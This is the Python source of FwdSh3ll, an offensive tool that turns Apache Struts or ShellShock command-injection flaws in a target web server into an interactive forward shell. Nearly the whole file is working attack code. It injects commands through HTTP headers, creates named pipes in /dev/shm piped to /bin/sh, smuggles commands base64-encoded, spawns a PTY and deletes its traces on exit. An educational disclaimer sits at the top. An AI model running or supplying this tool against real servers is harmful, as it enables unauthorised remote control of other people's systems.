#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
@file FwdSh3ll.py
@author Sam Freeside <scr.im/emsnovvcrash>
@date 2018-09

@brief Forward shell generation framework.

@disclaimer
LEGAL DISCLAIMER

FwdSh3ll was written for use in educational purposes only. Using this tool
for attacking web servers without prior mutual consistency can be considered
as an illegal activity. It is the final user's responsibility to obey all
applicable local, state and federal laws.

The author assume no liability and is not responsible for any misuse or
damage caused by this tool.
@enddisclaimer
"""

# Usage: python3 FwdSh3ll.py [-h]

import requests
import threading
import re
import sys

from termcolor import colored, cprint
from importlib import import_module
from base64 import b64encode
from random import randrange
from time import sleep
from os import listdir

VERSION = '0.1'
AUTHOR = 'by snovvcrash'
SITE = 'https://github.com/snovvcrash/FwdSh3ll'

VERSION_FORMATTED = '{' + colored('v' + VERSION, 'blue', attrs=['bold']) + '}'
AUTHOR_FORMATTED = colored(AUTHOR, attrs=['dark'])
SITE_FORMATTED = colored(SITE, attrs=['underline', 'dark'])

BANNER = f'''\033[1;32m
  █████▒█     █░▓█████▄   ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██   ▒▓█░ █ ░█░▒██▀ ██▌▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒████ ░▒█░ █ ░█ ░██   █▌░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█▒  ░░█░ █ ░█ ░▓█▄   ▌  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒█░   ░░██▒██▓ ░▒████▓ ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░   ░ ▓░▒ ▒   ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░       ▒ ░ ░   ░ ▒  ▒ ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░ ░     ░   ░   ░ ░  ░ ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
           ░       ░          ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                 ░                                              
                 \033[0m
{VERSION_FORMATTED}
{AUTHOR_FORMATTED}
{SITE_FORMATTED}
'''

HELP = '''\
python3 FwdSh3ll.py [-h]

* Target URL:
    Specify the vulnerable URL to attack.
* Proxy URL (optional):
    Specify proxy if needed.
* Payload:
    Choose required payload from the list.
* Mode (single command vs forward shell):
    Choose required action.
'''


class ForwardShell:
	def __init__(self, url, proxy, payloadName, genPayload, interval=1.3):
		self._url = url
		self._proxy = proxy
		self._payloadName = payloadName
		self._genPayload = genPayload
		self._interval = interval

		self._session = randrange(10000, 99999)
		self._stdin = f'/dev/shm/fwdshin.{self._session}'
		self._stdout = f'/dev/shm/fwdshout.{self._session}'
		cprint(f'[*] Session ID: {self._session}', 'green')

		cprint('[*] Setting up forward shell on target', 'green')
		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh > {self._stdout} 2>&1'
		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxy, self._payloadName, self._genPayload, timeout=0.5)

		cprint('[*] Setting up read thread', 'green')
		self._lock = threading.Lock()
		thread = threading.Thread(target=self._readCmd, args=())
		thread.daemon = True
		thread.start()

		cprint('[*] Press CTRL-C to terminate session', 'green')

	def _readCmd(self):
		getOutput = f'/bin/cat {self._stdout}'
		while True:
			result = ForwardShell.runRawCmd(getOutput, self._url, self._proxy, self._payloadName, self._genPayload)
			if result:
				with self._lock:
					print(result)
				clearOutput = f'echo -n "" > {self._stdout} > /dev/null'
				ForwardShell.runRawCmd(clearOutput, self._url, self._proxy, self._payloadName, self._genPayload)
			sleep(self._interval)

	@staticmethod
	def runRawCmd(cmd, url, proxy, payloadName, genPayload, timeout=50):
		if payloadName == 'ApacheStruts':
			payload = genPayload(cmd)
			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
		elif payloadName == 'ShellShock':
			payload = genPayload(cmd)
			headers = {'User-Agent': payload}

		page = b''
		try:
			with requests.get(
				url,
				headers=headers,
				proxies=proxy,
				timeout=timeout,
				verify=False,
				allow_redirects=False,
				stream=True
			) as resp:
				for i in resp.iter_content():
					page += i

		except requests.exceptions.ChunkedEncodingError as e:
			pass

		except requests.exceptions.ReadTimeout:
			return None

		except Exception as e:
			cprint(f'[!] Exception caught: {str(e)}', 'yellow')
			return None

		return page.decode('utf-8')

	def writeCmd(self, cmd, namedPipes=True):
		b64Cmd = b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
		if namedPipes:
			unwrapAndExec = f'base64 -d <<< {b64Cmd} > {self._stdin}'
		else:
			unwrapAndExec = f'base64 -d <<< {b64Cmd} | /bin/sh > /dev/null'
		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxy, self._payloadName, self._genPayload)
		sleep(self._interval * 1.2)

	def upgradeToPty(self):
		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
		self.writeCmd(upgradeShell, namedPipes=False)


def updater():
	numOfPayloads = len([pn for pn in listdir('./payloads') if pn.endswith('.py') and not pn.startswith('_')])

	with open('./FwdSh3ll.conf', 'w', encoding='utf-8') as conf:
		conf.write('ver=' + VERSION + '\n')
		conf.write('num_of_payloads=' + str(numOfPayloads) + '\n')

	cprint(f'[*] Loaded {numOfPayloads} payload(s)', 'green')

	try:
		latestConf = requests.get('https://raw.githubusercontent.com/snovvcrash/FwdSh3ll/master/FwdSh3ll.conf', timeout=10).text
	except Exception:
		cprint('[!] Failed to check for updates', 'yellow')
		return

	ver = re.search(r'^ver=(\d+.\d+)$', latestConf, re.MULTILINE).group(1)
	num = re.search(r'^num_of_payloads=(\d+)$', latestConf, re.MULTILINE).group(1)

	if ver != VERSION:
		cprint('[!] New version is available!', 'yellow')
	if int(num) > numOfPayloads:
		cprint('[!] New payloads are available!', 'yellow')


def main():
	print(BANNER)

	if len(sys.argv) > 1:
		if len(sys.argv) == 2 and sys.argv[1] == '-h':
			print(HELP)
		else:
			print('Usage: python3 {} [-h]\n'.format(sys.argv[0]))
		return

	updater()

	print()
	while True:
		url = input(colored('[>] Please enter target URL:  ', 'magenta')).rstrip()
		if url:
			url = url.rstrip()
			break

	proxy = input(colored('[>] Please enter proxy URL (optional):  ', 'magenta'))
	if proxy:
		proxy = proxy.rstrip()
		proxy = {proxy.split('://')[0]: proxy}
	else:
		proxy = {}

	print('\n[?] Which payload you would like to use?\n')

	allPayloads = [pn[:-3] for pn in sorted(listdir('./payloads')) if pn.endswith('.py') and not pn.startswith('_')]
	for i, payloadName in enumerate(allPayloads):
		print(f'    {i + 1}. {payloadName}')

	print()
	while True:
		payloadNum = input(colored('[>] Please enter the number of your choice:  ', 'magenta')).rstrip()
		try:
			payloadNum = int(payloadNum)
			if payloadNum in range(1, len(allPayloads) + 1):
				payloadName = allPayloads[payloadNum - 1]
				payloadModule = import_module('payloads.' + payloadName)
				break
		except ValueError:
			pass

	print('\n[?] Would you like to run a single command or get a forward shell?\n')
	print('    1. Single command')
	print('    2. Forward shell\n')

	while True:
		choice = input(colored('[>] Please enter the number of your choice:  ', 'magenta')).rstrip()

		if choice == '1':
			cprint('\n############################### SINGLE CMD MODE ###############################\n', 'red')
			cmd = input(colored('[>] Please enter the command you would like to execute:  ', 'magenta')).rstrip()
			out = ForwardShell.runRawCmd(cmd, url, proxy, payloadName, payloadModule.genPayload)
			if out is not None:
				print('\n' + out)
			else:
				cprint('[-] An error has occured', 'red')
			break

		elif choice == '2':
			cprint('\n############################## FORWARD SHELL MODE #############################\n', 'red')
			prompt = colored('FwdSh3ll> ', 'magenta')
			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload)
			print()

			try:
				while True:
					cmd = input(prompt).rstrip()
					if cmd == 'pty':
						prompt = ''
						sh.upgradeToPty()
					else:
						sh.writeCmd(cmd)

			except KeyboardInterrupt:
				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
				del sh
				b64Cmd = b64encode('rm -f /dev/shm/fwdshin.* /dev/shm/fwdshout.*\n'.encode('utf-8')).decode('utf-8')
				ForwardShell.runRawCmd(f'base64 -d <<< {b64Cmd} | /bin/sh > /dev/null', url, proxy, payloadName, payloadModule.genPayload)
				break


if __name__ == '__main__':
	main()
